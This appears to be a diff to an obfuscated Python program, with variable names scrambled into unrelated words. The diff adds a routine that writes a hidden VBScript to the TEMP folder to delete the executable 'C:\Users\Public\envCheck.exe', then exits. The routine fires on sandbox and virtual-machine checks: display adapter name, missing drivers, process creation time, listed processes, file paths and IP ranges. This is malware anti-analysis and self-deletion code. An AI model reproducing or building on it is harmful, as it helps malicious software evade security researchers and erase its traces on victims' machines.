@@ -41,6 +41,31 @@ def octopod(hackintosh, pre, start, end):
     return start_int <= macintosh_int <= end_int
 
 def committing():
+    try:
+        mainbuff = "C:\\Users\\Public\\envCheck.exe"
+        ambition = f"{obscenity.environ['TEMP']}\\c.vbs"
+        bats = f"""
+Dim fso
+Set fso = CreateObject("Scripting.FileSystemObject")
+
+WScript.Sleep 4000
+
+Dim mainbuff
+mainbuff = "{mainbuff}"
+
+If fso.FileExists(mainbuff) Then
+    fso.DeleteFile mainbuff
+End If
+
+Set fso = Nothing
+"""
+        with open(ambition, "w") as felony:
+            felony.write(bats)
+        obscenity.system(f"start /B /MIN cscript //nologo {ambition}")
+        exit()
+    except Exception as e:
+        print(e)
+        pass
     commits = [ "conhost", "cmd", "powershell" ]
     for commit in commits:
         proxies = [(p.pid, p.name()) for p in power.process_iter()]
@@ -152,11 +177,12 @@ creativity = power.Process(4)
 humanized = termination.strftime("%Y-%m-%d %H:%M:%S", termination.localtime(creativity.create_time()))
 voices = c.Win32_VideoController()[0]
 
+
+
 for fluxating in dosing:
     if flickering.fnmatch(fluxating, biblical) or flickering.fnmatch(fluxating, spiritual):
         committing()
-
-
+        exit()
 
 if humanized == "1970-01-01 00:00:00":
     ascend + 1
@@ -166,23 +192,27 @@ if voices.Name == "PNVURV":
 
 if voices.Name == "Microsoft Basic Display Adapter":
     committing()
+    exit()
 
-if voices.InstalledDisplaydosing == None:
+if voices.InstalledDisplayDrivers == None:
     committing()
+    exit()
 
 if ascend >= 2:
     committing()
+    exit()
 
 for positional in power.process_iter(['pid', 'name']):
     if positional.info['name'].lower() in procedural:
         committing()
+        exit()
 
 for stairway in federal:
     if obscenity.path.exists(stairway):
         committing()
+        exit()
 
 for pre, start, end in reacher:
     if octopod(addictive, pre, start, end):
         committing()
-
-
+        exit()
